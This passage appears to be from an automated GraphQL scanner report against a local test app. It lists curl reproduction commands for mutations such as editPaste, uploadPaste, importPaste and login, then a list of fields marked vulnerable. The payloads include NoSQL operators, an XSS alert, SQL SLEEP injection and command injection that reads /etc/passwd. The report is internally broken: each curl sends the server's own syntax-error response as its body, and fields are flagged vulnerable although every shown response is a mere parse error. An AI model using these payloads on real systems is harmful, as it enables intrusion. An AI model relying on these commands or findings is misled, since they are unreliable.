curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 139' -d '{"errors":[{"message":"Syntax Error GraphQL (3:43) Expected Name, found $\n\n2:                 mutation {\n3:                     editPaste(content: \"{\"$gt\": \"\"}\")\n                                             ^\n4:                 }\n","locations":[{"line":3,"column":43}]}]}' http://127.0.0.1:5013/graphql
```

48. For field `editPaste.content` with payload `"{"$ne": null}"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 139' -d '{"errors":[{"message":"Syntax Error GraphQL (3:43) Expected Name, found $\n\n2:                 mutation {\n3:                     editPaste(content: \"{\"$ne\": null}\")\n                                             ^\n4:                 }\n","locations":[{"line":3,"column":43}]}]}' http://127.0.0.1:5013/graphql
```

49. For field `editPaste.content` with payload `""); alert("XSS"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 140' -d '{"errors":[{"message":"Syntax Error GraphQL (3:43) Unexpected character \";\".\n\n2:                 mutation {\n3:                     editPaste(content: \"\"); alert(\"XSS\")\n                                             ^\n4:                 }\n","locations":[{"line":3,"column":43}]}]}' http://127.0.0.1:5013/graphql
```

50. For field `editPaste.content` with payload `"" SLEEP(5) --"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 138' -d '{"errors":[{"message":"Syntax Error GraphQL (3:48) Expected :, found (\n\n2:                 mutation {\n3:                     editPaste(content: \"\" SLEEP(5) --\")\n                                                  ^\n4:                 }\n","locations":[{"line":3,"column":48}]}]}' http://127.0.0.1:5013/graphql
```

51. For field `editPaste.id` with payload `null`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 119' -d '{"errors":[{"message":"Syntax Error GraphQL (3:35) Unexpected Name \"null\"\n\n2:                 mutation {\n3:                     editPaste(id: null)\n                                     ^\n4:                 }\n","locations":[{"line":3,"column":35}]}]}' http://127.0.0.1:5013/graphql
```

52. For field `editPaste.title` with payload `"{"$gt": ""}"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 137' -d '{"errors":[{"message":"Syntax Error GraphQL (3:41) Expected Name, found $\n\n2:                 mutation {\n3:                     editPaste(title: \"{\"$gt\": \"\"}\")\n                                           ^\n4:                 }\n","locations":[{"line":3,"column":41}]}]}' http://127.0.0.1:5013/graphql
```

53. For field `editPaste.title` with payload `"{"$ne": null}"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 137' -d '{"errors":[{"message":"Syntax Error GraphQL (3:41) Expected Name, found $\n\n2:                 mutation {\n3:                     editPaste(title: \"{\"$ne\": null}\")\n                                           ^\n4:                 }\n","locations":[{"line":3,"column":41}]}]}' http://127.0.0.1:5013/graphql
```

54. For field `editPaste.title` with payload `""); alert("XSS"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 138' -d '{"errors":[{"message":"Syntax Error GraphQL (3:41) Unexpected character \";\".\n\n2:                 mutation {\n3:                     editPaste(title: \"\"); alert(\"XSS\")\n                                           ^\n4:                 }\n","locations":[{"line":3,"column":41}]}]}' http://127.0.0.1:5013/graphql
```

55. For field `editPaste.title` with payload `"" SLEEP(5) --"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 136' -d '{"errors":[{"message":"Syntax Error GraphQL (3:46) Expected :, found (\n\n2:                 mutation {\n3:                     editPaste(title: \"\" SLEEP(5) --\")\n                                                ^\n4:                 }\n","locations":[{"line":3,"column":46}]}]}' http://127.0.0.1:5013/graphql
```

56. For field `deletePaste.id` with payload `null`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 121' -d '{"errors":[{"message":"Syntax Error GraphQL (3:37) Unexpected Name \"null\"\n\n2:                 mutation {\n3:                     deletePaste(id: null)\n                                       ^\n4:                 }\n","locations":[{"line":3,"column":37}]}]}' http://127.0.0.1:5013/graphql
```

57. For field `uploadPaste.content` with payload `{"$gt": ""}`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 137' -d '{"errors":[{"message":"Syntax Error GraphQL (3:43) Expected Name, found String \"$gt\"\n\n2:                 mutation {\n3:                     uploadPaste(content: {\"$gt\": \"\"})\n                                             ^\n4:                 }\n","locations":[{"line":3,"column":43}]}]}' http://127.0.0.1:5013/graphql
```

58. For field `uploadPaste.content` with payload `{"$ne": null}`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 137' -d '{"errors":[{"message":"Syntax Error GraphQL (3:43) Expected Name, found String \"$ne\"\n\n2:                 mutation {\n3:                     uploadPaste(content: {\"$ne\": null})\n                                             ^\n4:                 }\n","locations":[{"line":3,"column":43}]}]}' http://127.0.0.1:5013/graphql
```

59. For field `uploadPaste.content` with payload `""); alert("XSS"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 142' -d '{"errors":[{"message":"Syntax Error GraphQL (3:45) Unexpected character \";\".\n\n2:                 mutation {\n3:                     uploadPaste(content: \"\"); alert(\"XSS\")\n                                               ^\n4:                 }\n","locations":[{"line":3,"column":45}]}]}' http://127.0.0.1:5013/graphql
```

60. For field `uploadPaste.content` with payload `null`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 126' -d '{"errors":[{"message":"Syntax Error GraphQL (3:42) Unexpected Name \"null\"\n\n2:                 mutation {\n3:                     uploadPaste(content: null)\n                                            ^\n4:                 }\n","locations":[{"line":3,"column":42}]}]}' http://127.0.0.1:5013/graphql
```

61. For field `uploadPaste.content` with payload `"" SLEEP(5) --"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 140' -d '{"errors":[{"message":"Syntax Error GraphQL (3:50) Expected :, found (\n\n2:                 mutation {\n3:                     uploadPaste(content: \"\" SLEEP(5) --\")\n                                                    ^\n4:                 }\n","locations":[{"line":3,"column":50}]}]}' http://127.0.0.1:5013/graphql
```

62. For field `uploadPaste.filename` with payload `{"$gt": ""}`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 138' -d '{"errors":[{"message":"Syntax Error GraphQL (3:44) Expected Name, found String \"$gt\"\n\n2:                 mutation {\n3:                     uploadPaste(filename: {\"$gt\": \"\"})\n                                              ^\n4:                 }\n","locations":[{"line":3,"column":44}]}]}' http://127.0.0.1:5013/graphql
```

63. For field `uploadPaste.filename` with payload `{"$ne": null}`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 138' -d '{"errors":[{"message":"Syntax Error GraphQL (3:44) Expected Name, found String \"$ne\"\n\n2:                 mutation {\n3:                     uploadPaste(filename: {\"$ne\": null})\n                                              ^\n4:                 }\n","locations":[{"line":3,"column":44}]}]}' http://127.0.0.1:5013/graphql
```

64. For field `uploadPaste.filename` with payload `""); alert("XSS"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 143' -d '{"errors":[{"message":"Syntax Error GraphQL (3:46) Unexpected character \";\".\n\n2:                 mutation {\n3:                     uploadPaste(filename: \"\"); alert(\"XSS\")\n                                                ^\n4:                 }\n","locations":[{"line":3,"column":46}]}]}' http://127.0.0.1:5013/graphql
```

65. For field `uploadPaste.filename` with payload `null`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 127' -d '{"errors":[{"message":"Syntax Error GraphQL (3:43) Unexpected Name \"null\"\n\n2:                 mutation {\n3:                     uploadPaste(filename: null)\n                                             ^\n4:                 }\n","locations":[{"line":3,"column":43}]}]}' http://127.0.0.1:5013/graphql
```

66. For field `uploadPaste.filename` with payload `"" SLEEP(5) --"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 141' -d '{"errors":[{"message":"Syntax Error GraphQL (3:51) Expected :, found (\n\n2:                 mutation {\n3:                     uploadPaste(filename: \"\" SLEEP(5) --\")\n                                                     ^\n4:                 }\n","locations":[{"line":3,"column":51}]}]}' http://127.0.0.1:5013/graphql
```

67. For field `importPaste.host` with payload `{"$gt": ""}`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 134' -d '{"errors":[{"message":"Syntax Error GraphQL (3:40) Expected Name, found String \"$gt\"\n\n2:                 mutation {\n3:                     importPaste(host: {\"$gt\": \"\"})\n                                          ^\n4:                 }\n","locations":[{"line":3,"column":40}]}]}' http://127.0.0.1:5013/graphql
```

68. For field `importPaste.host` with payload `{"$ne": null}`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 134' -d '{"errors":[{"message":"Syntax Error GraphQL (3:40) Expected Name, found String \"$ne\"\n\n2:                 mutation {\n3:                     importPaste(host: {\"$ne\": null})\n                                          ^\n4:                 }\n","locations":[{"line":3,"column":40}]}]}' http://127.0.0.1:5013/graphql
```

69. For field `importPaste.host` with payload `""); alert("XSS"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 139' -d '{"errors":[{"message":"Syntax Error GraphQL (3:42) Unexpected character \";\".\n\n2:                 mutation {\n3:                     importPaste(host: \"\"); alert(\"XSS\")\n                                            ^\n4:                 }\n","locations":[{"line":3,"column":42}]}]}' http://127.0.0.1:5013/graphql
```

70. For field `importPaste.host` with payload `null`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 123' -d '{"errors":[{"message":"Syntax Error GraphQL (3:39) Unexpected Name \"null\"\n\n2:                 mutation {\n3:                     importPaste(host: null)\n                                         ^\n4:                 }\n","locations":[{"line":3,"column":39}]}]}' http://127.0.0.1:5013/graphql
```

71. For field `importPaste.host` with payload `"" SLEEP(5) --"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 137' -d '{"errors":[{"message":"Syntax Error GraphQL (3:47) Expected :, found (\n\n2:                 mutation {\n3:                     importPaste(host: \"\" SLEEP(5) --\")\n                                                 ^\n4:                 }\n","locations":[{"line":3,"column":47}]}]}' http://127.0.0.1:5013/graphql
```

72. For field `importPaste.path` with payload `{"$gt": ""}`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 134' -d '{"errors":[{"message":"Syntax Error GraphQL (3:40) Expected Name, found String \"$gt\"\n\n2:                 mutation {\n3:                     importPaste(path: {\"$gt\": \"\"})\n                                          ^\n4:                 }\n","locations":[{"line":3,"column":40}]}]}' http://127.0.0.1:5013/graphql
```

73. For field `importPaste.path` with payload `{"$ne": null}`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 134' -d '{"errors":[{"message":"Syntax Error GraphQL (3:40) Expected Name, found String \"$ne\"\n\n2:                 mutation {\n3:                     importPaste(path: {\"$ne\": null})\n                                          ^\n4:                 }\n","locations":[{"line":3,"column":40}]}]}' http://127.0.0.1:5013/graphql
```

74. For field `importPaste.path` with payload `""); alert("XSS"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 139' -d '{"errors":[{"message":"Syntax Error GraphQL (3:42) Unexpected character \";\".\n\n2:                 mutation {\n3:                     importPaste(path: \"\"); alert(\"XSS\")\n                                            ^\n4:                 }\n","locations":[{"line":3,"column":42}]}]}' http://127.0.0.1:5013/graphql
```

75. For field `importPaste.path` with payload `null`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 123' -d '{"errors":[{"message":"Syntax Error GraphQL (3:39) Unexpected Name \"null\"\n\n2:                 mutation {\n3:                     importPaste(path: null)\n                                         ^\n4:                 }\n","locations":[{"line":3,"column":39}]}]}' http://127.0.0.1:5013/graphql
```

76. For field `importPaste.path` with payload `"" SLEEP(5) --"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 137' -d '{"errors":[{"message":"Syntax Error GraphQL (3:47) Expected :, found (\n\n2:                 mutation {\n3:                     importPaste(path: \"\" SLEEP(5) --\")\n                                                 ^\n4:                 }\n","locations":[{"line":3,"column":47}]}]}' http://127.0.0.1:5013/graphql
```

77. For field `importPaste.port` with payload `null`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 123' -d '{"errors":[{"message":"Syntax Error GraphQL (3:39) Unexpected Name \"null\"\n\n2:                 mutation {\n3:                     importPaste(port: null)\n                                         ^\n4:                 }\n","locations":[{"line":3,"column":39}]}]}' http://127.0.0.1:5013/graphql
```

78. For field `importPaste.scheme` with payload `{"$gt": ""}`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 136' -d '{"errors":[{"message":"Syntax Error GraphQL (3:42) Expected Name, found String \"$gt\"\n\n2:                 mutation {\n3:                     importPaste(scheme: {\"$gt\": \"\"})\n                                            ^\n4:                 }\n","locations":[{"line":3,"column":42}]}]}' http://127.0.0.1:5013/graphql
```

79. For field `importPaste.scheme` with payload `{"$ne": null}`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 136' -d '{"errors":[{"message":"Syntax Error GraphQL (3:42) Expected Name, found String \"$ne\"\n\n2:                 mutation {\n3:                     importPaste(scheme: {\"$ne\": null})\n                                            ^\n4:                 }\n","locations":[{"line":3,"column":42}]}]}' http://127.0.0.1:5013/graphql
```

80. For field `importPaste.scheme` with payload `""); alert("XSS"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 141' -d '{"errors":[{"message":"Syntax Error GraphQL (3:44) Unexpected character \";\".\n\n2:                 mutation {\n3:                     importPaste(scheme: \"\"); alert(\"XSS\")\n                                              ^\n4:                 }\n","locations":[{"line":3,"column":44}]}]}' http://127.0.0.1:5013/graphql
```

81. For field `importPaste.scheme` with payload `null`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 125' -d '{"errors":[{"message":"Syntax Error GraphQL (3:41) Unexpected Name \"null\"\n\n2:                 mutation {\n3:                     importPaste(scheme: null)\n                                           ^\n4:                 }\n","locations":[{"line":3,"column":41}]}]}' http://127.0.0.1:5013/graphql
```

82. For field `importPaste.scheme` with payload `"" SLEEP(5) --"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 139' -d '{"errors":[{"message":"Syntax Error GraphQL (3:49) Expected :, found (\n\n2:                 mutation {\n3:                     importPaste(scheme: \"\" SLEEP(5) --\")\n                                                   ^\n4:                 }\n","locations":[{"line":3,"column":49}]}]}' http://127.0.0.1:5013/graphql
```

83. For field `createUser.userData` with payload `{"$gt": ""}`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 137' -d '{"errors":[{"message":"Syntax Error GraphQL (3:43) Expected Name, found String \"$gt\"\n\n2:                 mutation {\n3:                     createUser(userData: {\"$gt\": \"\"})\n                                             ^\n4:                 }\n","locations":[{"line":3,"column":43}]}]}' http://127.0.0.1:5013/graphql
```

84. For field `createUser.userData` with payload `{"$ne": null}`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 137' -d '{"errors":[{"message":"Syntax Error GraphQL (3:43) Expected Name, found String \"$ne\"\n\n2:                 mutation {\n3:                     createUser(userData: {\"$ne\": null})\n                                             ^\n4:                 }\n","locations":[{"line":3,"column":43}]}]}' http://127.0.0.1:5013/graphql
```

85. For field `createUser.userData` with payload `""); alert("XSS"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 142' -d '{"errors":[{"message":"Syntax Error GraphQL (3:45) Unexpected character \";\".\n\n2:                 mutation {\n3:                     createUser(userData: \"\"); alert(\"XSS\")\n                                               ^\n4:                 }\n","locations":[{"line":3,"column":45}]}]}' http://127.0.0.1:5013/graphql
```

86. For field `createUser.userData` with payload `null`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 126' -d '{"errors":[{"message":"Syntax Error GraphQL (3:42) Unexpected Name \"null\"\n\n2:                 mutation {\n3:                     createUser(userData: null)\n                                            ^\n4:                 }\n","locations":[{"line":3,"column":42}]}]}' http://127.0.0.1:5013/graphql
```

87. For field `createUser.userData` with payload `"" SLEEP(5) --"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 140' -d '{"errors":[{"message":"Syntax Error GraphQL (3:50) Expected :, found (\n\n2:                 mutation {\n3:                     createUser(userData: \"\" SLEEP(5) --\")\n                                                    ^\n4:                 }\n","locations":[{"line":3,"column":50}]}]}' http://127.0.0.1:5013/graphql
```

88. For field `login.password` with payload `"{"$gt": ""}"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 181' -d '{"errors":[{"message":"Syntax Error GraphQL (3:40) Expected Name, found $\n\n2:                 mutation {\n3:                     login(password: \"{\"$gt\": \"\"}\", username: \"admin\", password: \"changeme\")\n                                          ^\n4:                 }\n","locations":[{"line":3,"column":40}]}]}' http://127.0.0.1:5013/graphql
```

89. For field `login.password` with payload `"{"$ne": null}"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 181' -d '{"errors":[{"message":"Syntax Error GraphQL (3:40) Expected Name, found $\n\n2:                 mutation {\n3:                     login(password: \"{\"$ne\": null}\", username: \"admin\", password: \"changeme\")\n                                          ^\n4:                 }\n","locations":[{"line":3,"column":40}]}]}' http://127.0.0.1:5013/graphql
```

90. For field `login.password` with payload `""); alert("XSS"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 182' -d '{"errors":[{"message":"Syntax Error GraphQL (3:40) Unexpected character \";\".\n\n2:                 mutation {\n3:                     login(password: \"\"); alert(\"XSS\", username: \"admin\", password: \"changeme\")\n                                          ^\n4:                 }\n","locations":[{"line":3,"column":40}]}]}' http://127.0.0.1:5013/graphql
```

91. For field `login.password` with payload `"" SLEEP(5) --"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 180' -d '{"errors":[{"message":"Syntax Error GraphQL (3:45) Expected :, found (\n\n2:                 mutation {\n3:                     login(password: \"\" SLEEP(5) --\", username: \"admin\", password: \"changeme\")\n                                               ^\n4:                 }\n","locations":[{"line":3,"column":45}]}]}' http://127.0.0.1:5013/graphql
```

92. For field `login.username` with payload `"{"$gt": ""}"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 181' -d '{"errors":[{"message":"Syntax Error GraphQL (3:40) Expected Name, found $\n\n2:                 mutation {\n3:                     login(username: \"{\"$gt\": \"\"}\", username: \"admin\", password: \"changeme\")\n                                          ^\n4:                 }\n","locations":[{"line":3,"column":40}]}]}' http://127.0.0.1:5013/graphql
```

93. For field `login.username` with payload `"{"$ne": null}"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 181' -d '{"errors":[{"message":"Syntax Error GraphQL (3:40) Expected Name, found $\n\n2:                 mutation {\n3:                     login(username: \"{\"$ne\": null}\", username: \"admin\", password: \"changeme\")\n                                          ^\n4:                 }\n","locations":[{"line":3,"column":40}]}]}' http://127.0.0.1:5013/graphql
```

94. For field `login.username` with payload `""); alert("XSS"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 182' -d '{"errors":[{"message":"Syntax Error GraphQL (3:40) Unexpected character \";\".\n\n2:                 mutation {\n3:                     login(username: \"\"); alert(\"XSS\", username: \"admin\", password: \"changeme\")\n                                          ^\n4:                 }\n","locations":[{"line":3,"column":40}]}]}' http://127.0.0.1:5013/graphql
```

95. For field `login.username` with payload `"" SLEEP(5) --"`:
```bash
curl -X POST -H 'Host: 127.0.0.1:5013' -H 'Content-Type: application/json' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'User-Agent: Python/3.13 aiohttp/3.11.16' -H 'Content-Length: 180' -d '{"errors":[{"message":"Syntax Error GraphQL (3:45) Expected :, found (\n\n2:                 mutation {\n3:                     login(username: \"\" SLEEP(5) --\", username: \"admin\", password: \"changeme\")\n                                               ^\n4:                 }\n","locations":[{"line":3,"column":45}]}]}' http://127.0.0.1:5013/graphql
```

**Vulnerable Fields**:

1. `query.pastes.limit` with payload: `null`
2. `query.pastes.filter` with payload: `"{"$gt": ""}"`
3. `query.pastes.filter` with payload: `"{"$ne": null}"`
4. `query.pastes.filter` with payload: `""); alert("XSS"`
5. `query.pastes.filter` with payload: `"" SLEEP(5) --"`
6. `query.paste.id` with payload: `null`
7. `query.paste.title` with payload: `"{"$gt": ""}"`
8. `query.paste.title` with payload: `"{"$ne": null}"`
9. `query.paste.title` with payload: `""); alert("XSS"`
10. `query.paste.title` with payload: `"" SLEEP(5) --"`
11. `query.systemDiagnostics.username` with payload: `"{"$gt": ""}"`
12. `query.systemDiagnostics.username` with payload: `"{"$ne": null}"`
13. `query.systemDiagnostics.username` with payload: `""); alert("XSS"`
14. `query.systemDiagnostics.username` with payload: `"" SLEEP(5) --"`
15. `query.systemDiagnostics.password` with payload: `"{"$gt": ""}"`
16. `query.systemDiagnostics.password` with payload: `"{"$ne": null}"`
17. `query.systemDiagnostics.password` with payload: `""); alert("XSS"`
18. `query.systemDiagnostics.password` with payload: `"" SLEEP(5) --"`
19. `query.systemDiagnostics.cmd` with payload: `"{"$gt": ""}"`
20. `query.systemDiagnostics.cmd` with payload: `"{"$ne": null}"`
21. `query.systemDiagnostics.cmd` with payload: `""); alert("XSS"`
22. `query.systemDiagnostics.cmd` with payload: `"" SLEEP(5) --"`
23. `query.systemDebug.arg` with payload: `"{"$gt": ""}"`
24. `query.systemDebug.arg` with payload: `"{"$ne": null}"`
25. `query.systemDebug.arg` with payload: `"| cat /etc/passwd"`
26. `query.systemDebug.arg` with payload: `"$(cat /etc/passwd)"`
27. `query.systemDebug.arg` with payload: `""); alert("XSS"`
28. `query.systemDebug.arg` with payload: `"" SLEEP(5) --"`
29. `query.users.id` with payload: `null`
30. `query.readAndBurn.id` with payload: `null`
31. `query.search.keyword` with payload: `"{"$gt": ""}"`
32. `query.search.keyword` with payload: `"{"$ne": null}"`
33. `query.search.keyword` with payload: `""); alert("XSS"`
34. `query.search.keyword` with payload: `"" SLEEP(5) --"`
35. `query.me.token` with payload: `"{"$gt": ""}"`
36. `query.me.token` with payload: `"{"$ne": null}"`
37. `query.me.token` with payload: `""); alert("XSS"`
38. `query.me.token` with payload: `"" SLEEP(5) --"`
39. `mutation.createPaste.content` with payload: `"{"$gt": ""}"`
40. `mutation.createPaste.content` with payload: `"{"$ne": null}"`
41. `mutation.createPaste.content` with payload: `""); alert("XSS"`
